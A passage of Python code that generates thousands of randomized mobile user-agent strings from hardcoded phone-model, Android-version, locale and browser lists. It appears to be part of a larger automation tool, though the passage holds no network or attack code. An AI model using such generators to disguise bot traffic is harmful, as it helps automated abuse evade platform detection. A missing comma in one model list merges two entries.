YandexSearchBrowser/7.30','Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-U22 Build/HUAWEILUA-U22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36 YandexSearch/5.23','Mozilla/5.0 (Linux; Android 9; CPH1931 Build/PKQ1.190714.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.83 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80','Mozilla/5.0 (Linux; Android 7.0; S10 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 YandexSearch/7.40 YandexSearchBrowser/7.40','Mozilla/5.0 (Linux; Android 8.0.0; SM-J400F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 YandexSearch/8.00 YandexSearchBrowser/8.00','Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.45 YandexSearchBrowser/7.45','Mozilla/5.0 (Linux; Android 9; AMN-LX9 Build/HUAWEIAMN-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Mobile Safari/537.36 YandexSearch/7.30 YandexSearchBrowser/7.30'])
	pc = random.choice(['Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Mi A2 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Infinix Zero 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-A205F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; LG-X240 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; LM-X430 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; POT-LX3 Build/HUAWEIPOT-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-A307G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S) Build/OPP28.65-37-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-J710MN Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G973U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.83 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; LM-Q720 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-A205U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148','Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G975U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; MI MAX Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; SM-T585 Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; HTC One M9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; D6503 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-N975U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; LG-K220 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148','Mozilla/5.0 (Linux; Android 10; SM-G975F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; BND-L21 Build/HONORBND-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G935V Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5010 Build/VDL37; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-A505FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36'])
	pd = random.choice(['Mozilla/5.0 (Linux; Android 4.4.1; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-A700S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Crosswalk/20.50.533.55 Mobile Safari/537.36 NAVER(inapp; search; 590; 8.8.3)','Mozilla/5.0 (Linux; Android 4.1.1; HP Slate 7 Build/JRO03H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Crosswalk/14.43.343.22 Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; KFDOWI Build/LVY48F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Crosswalk/22.52.561.4 Safari/537.36','Mozilla/5.0 (Linux; Android 9.0; SM-T820 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Crosswalk/18.48.477.13 Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; KFDOWI Build/LVY48F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.4 Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; Snappet Q72-B Build/Q72-B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Safari/537.36;Snappet','Mozilla/5.0 (Linux; Android 4.2.2; rk30sdk_rtl8723 Build/JDQ39; vtech-1668/62.ETPP8; cclll-DEger) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; AR518F Build/LMY49F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Crosswalk/20.50.533.12 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1; SM-T580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI Build/NS6315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Crosswalk/22.52.561.4 Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; SM-J500N0 Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.596.0 Mobile Safari/537.36 NAVER(inapp; search; 680; 10.12.1)','Mozilla/5.0 (Linux; Android 8.0; LGM-G600K Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Crosswalk/20.50.533.61 Mobile Safari/537.36 NAVER(inapp; search; 590; 8.8.6)','Mozilla/5.0 (Linux; U; Android 4.4.2; en; GO! HD Duoal core 3G Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Crosswalk/18.48.477.13 Tenta/0.72 Mobile Safari/537.36 Mobile','Mozilla/5.0 (Linux; Android 7.0; SM-N920K Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.604.0 Mobile Safari/537.36 NAVER(inapp; search; 597; 10.21.4)','Mozilla/5.0 (Linux; Android 10.0; SM-A705MN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Crosswalk/20.50.533.12 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10.0; Mi 9T Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Mobile Safari/537.36voicefxp fxpapp','Mozilla/5.0 (Linux; Android 9.0; SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Mobile Safari/537.36voicefxp fxpapp','Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI Build/NS6300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; LG-F600S Build/NRD90U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.604.0 Mobile Safari/537.36 NAVER(inapp; search; 597; 10.21.1)','Mozilla/5.0 (Linux; Android 8.0.0; LGM-G600S Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.604.0 Mobile Safari/537.36 NAVER(inapp; search; 710; 10.21.0)','Mozilla/5.0 (Linux; Android 9; SM-T595N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.603.0 Safari/537.36 NAVER(inapp; search; 700; 10.20.1)','Mozilla/5.0 (Linux; Android 5.1.1; XORO MegaPAD2404V2 Build/XORO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-N920S Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.603.0 Mobile Safari/537.36 NAVER(inapp; search; 700; 10.20.1)','Mozilla/5.0 (Linux; Android 8.0.0; SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.603.0 Mobile Safari/537.36 NAVER(inapp; search; 596; 10.20.1)','Mozilla/5.0 (Linux; Android 7.0; SM-G930S Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.600.0 Mobile Safari/537.36 NAVER(inapp; search; 690; 10.16.1)','Mozilla/5.0 (Linux; Android 8.0.0; SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.602.0 Mobile Safari/537.36 NAVER(inapp; search; 690; 10.18.1)','Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI Build/NS6315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Crosswalk/22.52.561.4 Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI Build/NS6315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; LG-H870S Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.601.0 Mobile Safari/537.36 NAVER(inapp; search; 690; 10.17.1)','Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI Build/NS6315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-N920K Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Crosswalk/20.50.533.67 Mobile Safari/537.36 NAVER(inapp; search; 591; 9.0.6)','Mozilla/5.0 (Linux; Android 9.0; KFMAWI Build/PS7312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI Build/NS6314) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.4 Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI Build/NS6314) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Crosswalk/22.52.561.4 Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G930S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.128 Whale/1.0.0.0 Crosswalk/23.69.600.0 Mobile Safari/537.36 NAVER(inapp; search; 690; 10.16.3)','Mozilla/5.0 (Linux; Android 10.0; SM-N975F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Crosswalk/18.48.477.13 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI Build/NS6314) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Z815 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Crosswalk/11.45.2454.20160425 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; MI MAX Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Crosswalk/18.48.477.13 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI Build/NS6314) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Crosswalk/22.52.561.4 Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI Build/NS6314) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Safari/537.36','Mozilla/5.0 (Linux; Android 9.0; CLT-L29 Build/HUAWEICLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Crosswalk/18.48.477.13 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9.0; SM-A920F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Crosswalk/18.48.477.13 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; KFDOWI Build/LVY48F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Crosswalk/11.45.2454.20161222 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.1; ZTE A2017G Build/NMF26V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94 Mobile Crosswalk/11.45.2454.20170417 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-N910F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.2 Mobile Safari/537.36 QwantMobile/1.1','Mozilla/5.0 (Linux; Android 4.4.4; S57 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Crosswalk/14.43.343.22 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Crosswalk/20.50.533.48 Mobile Safari/537.36 NAVER(inapp; search; 580; 8.6.2)'])
	sa = f'{uas}'
	si = f'{pa}'
	su =f'{pb}'
	se = f'{pc}'
	so = f'{pd}'
	sole = random.choice([sa,si,su,se,so])
	usragent.append(sole)



for xt in range(1000):
 rr = random.randint
 andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
 oppo = random.choice(["CPH2179", "CPH2477", "CPH1931", "PDCM00", "CPH1935", "CPH1959", "CPH1933", "PGIM10", "CPH1943", "CPH1955", "CUN-AL00", "PCGM00", "CPH2173", "PEEM00", "OPPOJLAJH6", "OPPO A59t", "CPH2339", "OPPO A79k", "R8205", "PFUM10", "PCHM30", "PDCM00", "OPPO A37m", "CPH2077", "CPH1801", "CPH1853", "CPH1729", "CPH1909", "CPH2015", "CPH1945", "OPPOR805", "R819T", "R823T", "CPH2531", "CPH1989", "CPH2113", "PDRM00", "PDRT00", "CPH2457", "PCKM70", "PCKT00", "PCKM00", "CPH1907", "U705T", "OPPOT29", "OPPO x20", "Oppo Y21", "oppo f 5 plus", "CPH9763", "CPH6271", "CPH6519", "CPH6528", "CPH7364", "A1603", "CPH1903", "CPH1901", "CPH1905", "PBFM00", "PBFT00", "CPH1909", "CPH1920", "PCEM00", "PFUM10", "PFGM00", "OPPO R7t", "CPH2339", "R2001", "CPH1877", "PBDM00"])
 build=random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
 tipe=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020','021'])
 rfn1=f'Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(10,116))+'.0.'+str(random.randrange(10,4798))+'.'+str(random.randrange(10,499))+'Mobile Safari/537.36'
 uaku4 = random.choice([rfn1])
 usrgent2.append(uaku4)


for agenku in range(10000):
            a =random.randrange(4,12)
            realmi = random.choice([
            'RMX2193',
            'RMX3516',
            'RMX3371',
            'RMX3461'
            'RMX3286',
            'RMX3561',
            'RMX3388',
            'RMX3311',
            'RMX3142',
            'RMX2071',
            'RMX1805',
            'RMX1809',
            'RMX1801',
            'RMX1807',
            'RMX1803',
            'RMX1825',
            'RMX1821',
            'RMX1822',
            'RMX1833',
            'RMX1851',
            'RMX1853',
            'RMX1827',
            'RMX1911',
            'RMX1919',
            'RMX1927',
            'RMX1971',
            'RMX1973',
            'RMX2030',
            'RMX2032',
            'RMX1925',
            'RMX1929',
            'RMX2001',
            'RMX2061',
            'RMX2063',
            'RMX2040',
            'RMX2042',
            'RMX2002',
            'RMX2151',
            'RMX2163',
            'RMX2155',
            'RMX2170',
            'RMX2103',
            'RMX3085',
            'RMX3241',
            'RMX3081',
            'RMX3151',
            'RMX3381',
            'RMX3521',
            'RMX3474',
            'RMX3471',
            'RMX3472',
            'RMX3392',
            'RMX3393',
            'RMX3491',
            'RMX1811',
            'RMX2185',
            'RMX3231',
            'RMX2189',
            'RMX2180',
            'RMX2195',
            'RMX2101',
            'RMX1941',
            'RMX1945',
            'RMX3063',
            'RMX3061',
            'RMX3201',
            'RMX3203',
            'RMX3261',
            'RMX3263',
            'RMX3193',
            'RMX3191',
            'RMX3195',
            'RMX3197',
            'RMX3265',
            'RMX3268',
            'RMX3269',
            'RMX2027',
            'RMX2020',
            'RMX2021',
            'RMX3581',
            'RMX3501'])
            infinix = random.choice([
            'X676B',
            'X687',
            'X609',
            'X697',
            'X680D',
            'X507',
            'X605',
            'X668',
            'X6815B',
            'X624',
            'X655F',
            'X689C',
            'X608',
            'X698',
            'X682B',
            'X682C',
            'X688C',
            'X688B',
            'X658E',
            'X659B',
            'X689B',
            'X689',
            'X689D',
            'X662',
            'X662B',
            'X675',
            'X6812B',
            'X6812',
            'X6817B',
            'X6817',
            'X6816C',
            'X6816',
            'X6816D',
            'X668C',
            'X665B',
            'X665E',
            'X510',
            'X559C',
            'X559F',
            'X559',
            'X606',
            'X606C',
            'X606D',
            'X623',
            'X624B',
            'X625C',
            'X625D',
            'X625B',
            'X650D',
            'X650B',
            'X650',
            'X650C',
            'X655C',
            'X655D',
            'X680B',
            'X573',
            'X573B',
            'X622',
            'X693'])
            vivo = random.choice([
            'V2072A',
            'V2136A',
            'V2047A',
            'V2024A',
            'V2171A',
            'V1962A',
            'V2011A',
            'V2183A',
            'V2106A',
            'V2256A',
            'V1813A',
            'V1901A',
            'V2220A',
            'V1950A'])
            samsung = random.choice([
            'SM-A336B',
            'SM-A202F',
            'SM-A536E',
            'SM-A037G',
            'SM-A235M',
            'SM-S918B/DS',
            'SM-G6200',
            'SM-S901E',
            'SM-A127F',
            'SM-A716S',
            'SM-A137F',
            'SM-G390F',
            'SAMSUNG SM-R860',
            'SM-G981U1',
            'SM-A145R',
            'SM-G610M',
            'SM-A105M',
            'SM-A042F',
            'SM-N975U'])
            redmi = random.choice([
            'WDY-LX1',
            'TECNO CH6IS',
            'Redmi Note 8 Pro',
            'SM-A236B',
            'itel S663L',
            'V2163A',
            'itel A661W',
            'Xiaomi 13 Ultra',
            'motorola edge plus 2023',
            'SM-A217M',
            'G501',
            'moto g14',
            '23049RAD8C Build/TKQ1.221114.001',
            'FS454 Build/MRA58K',
            'NX679J',
            'ULTRAMINTT X6',
            'VFD 1100 Build/MRA58K',
            'Redmi K30i 5G',
            'A40 Build/MRA58K',
            'Redmi 10 5G',
            'RMX1945',
            'Note 12 Pro 5G',
            'Infinix X6825',
            'SM-N975F',
            'Redmi Y1 Lite',
            'Zero 4 Plus',
            'Zero X Pro',
            'Redmi Note 7 Pro',
            'Redmi Note 7S',
            'RMX2030',
            'Redmi Note 10 JE',
            'Redmi Note 11 4G',
            'Redmi Note 11T Pro',
            'Redmi Note 11T Pro+',
            'Redmi Note 11S 5G',
            'Redmi Note 11 5G',
            'Redmi 10',
            'Infinix X698',
            'Redmi Note 11',
            'Redmi 10S',
            'GOA-LX9',
            'V2057A',
            'V1955A',
            'Redmi Note 1',
            'Redmi Note 10',
            'Redmi K50',
            'Redmi 3X',
            'Redmi 1S',
            'Redmi 12C',
            'Redmi 2A',
            'Redmi 12',
            'SM-A105M',
            'Redmi 5 Pro',
            'Redmi 5 Plus',
            'Redmi 5pro',
            'Redmi 5A',
            'Redmi 85781',
            'Redmi 7i',
            'Redmi 7 Pro',
            'Redmi 7',
            'Redmi 7A',
            'Redmi 9A',
            'Redmi 9T NFC',
            'MOMO9 3GQ',
            'Redmi 9pro',
            'Redmi 9C',
            'Redmi Go',
            'Redmi A8',
            'Infinix X6816D',
            'Hot 11 (2020)',
            'NOTE 2 LTE'])            
            c = random.choice([
            'en-gb',
            'en-nz',
            'hi-in',
            'gu-in',
            'zh-TW',
            'es-es',
            'pt-br',
            'zh-cn',
            'zh-CN',
            'it-it',
            'it-it',
            'en-us',
            'zh-tw',
            'en-US',
            'fa-ir',
            'id-id'])
            d = random.randrange(1111, 2999)
            e = random.randrange(11, 19)
            f = random.randrange(73, 99)
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            i = random.choice([
            '12.22.0.3-gn',
            '12.13.2-gn',
            '12.16.3.1-gn',
            '12.18.3-gn',
            '12.10.3-gn',
            '12.11.4.2-gn',
            '12.15.2-gn',
            '12.9.3-gn',
            '12.12.1-gn',
            '12.8.33',
            '12.16.2-gn'])            
            j = random.choice([
            'Mozilla/5.0 (Linux; Android',
            'Mozilla/5.0 (Linux; arm; Android',
            'Mozilla/5.0 (Linux; arm_64; Android',
            'Mozilla/5.0 (X11; Linux android',
            'Mozilla/5.0 (Linux; U; Android'])
            rel = random.choice([
            'RealmeBrowser/35.5.0.8',
            'HeyTapBrowser/40.8.19.2',
            'SznProhlizec/10.2.2a',
            'OPR/29.0.2254.120398',
            'Firefox/110.0',
            'EdgA/105.0.1343.34',
            'Edg/118.0.2088.11'])
            infi = random.choice([
            'YaSearchBrowser/23.91.1',
            'HuaweiBrowser/12.1.1.3',
            'OPR/29.0.2254.120398',
            'Firefox/110.0',
            'EdgA/105.0.1343.34',
            'Edg/118.0.2088.11'])
            xio = random.choice([
            'XiaoMi/Mint Browser/3.9.3',
            'XiaoMi/MiuiBrowser/13.35.0-gn',
            'OPR/29.0.2254.120398',
            'Firefox/110.0',
            'EdgA/105.0.1343.34',
            'Edg/118.0.2088.11'])
            viv = random.choice([
            'VivoBrowser/16.6.52.0',
            'VivoBrowser/16.5.31.0',
            'VivoBrowser/16.7.0.2',
            'VivoBrowser/16.6.20.2'])
            sam = random.choice([
            'UCBrowser/13.4.2.1307',
            'UCBrowser/16.1.0.1261',
            'UCBrowser/13.3.8.1305',
            'UCBrowser/13.4.0.1306',
            'UCBrowser/12.12.10.1227'])
            # rex = random.choice([
            # 'Build/QP1A.190711.020; wv)',
            # ua1 =  f'{j} {c} {a}; Realmi {realmi} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {rel}'
            # ua2 =  f'{j} {c} {a}; Infinix {infinix} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {infi}'
            ua5 =  f'{j} {c} {a}; {redmi} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {xio}/{i}'
            ua3 =  f'{j} {a}; {c}; {vivo}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 {viv}'
            ua4 =  f'{j} {a}; {c}; {samsung}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} {sam} Mobile Safari/537.36'
